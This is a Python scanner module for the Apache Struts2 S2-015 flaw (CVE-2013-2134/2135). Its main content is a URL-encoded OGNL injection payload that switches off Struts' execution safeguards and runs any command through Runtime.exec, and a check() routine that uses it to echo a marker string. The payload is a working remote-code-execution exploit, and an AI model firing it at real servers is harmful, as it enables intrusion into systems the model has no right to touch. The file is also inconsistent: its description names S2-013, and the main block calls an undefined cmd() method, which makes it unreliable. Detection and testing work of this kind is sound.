#!/usr/bin/env python3

from app.lib.request import request
from app.lib.encode import urlencode
from app.lib.common import get_capta, get_useragent

class S2_015_1_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-015漏洞,又名CVE-2013-2134/CVE-2013-2135漏洞',
            'description': 'Struts2 S2-013漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.14.2',
            'date': '2013-06-03',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': get_useragent(),
            'Connection': "keep-alive",
        }
        self.payload = '''/%24%7B%23context%5B'xwork.MethodAccessor.denyMethodExecution'%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess')%2C%23m.setAccessible(true)%2C%23m.set(%23_memberAccess%2Ctrue)%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream())%2C%23q%7D.action'''
    
    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        try:
            check_url = self.url + self.payload.format(cmd = urlencode('echo' + ' ' + self.capta))
            check_req = await request.get(check_url, headers = self.headers)
            result = await check_req.text()
            if self.capta + '.jsp' in result.replace(' ', '').replace('\n', ''):
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    S2_015 = S2_015_1_BaseVerify('http://localhost:8080/s2_015_war_exploded/')
    print(S2_015.cmd('id'))
